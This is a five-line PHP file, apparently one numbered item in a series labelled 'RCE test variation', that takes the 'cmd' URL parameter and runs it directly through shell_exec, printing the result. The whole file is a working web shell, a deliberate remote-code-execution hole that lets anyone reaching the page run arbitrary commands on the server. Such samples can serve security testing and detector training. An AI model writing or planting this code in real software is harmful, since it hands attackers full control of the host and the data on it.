<?php
// RCE test variation #743
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>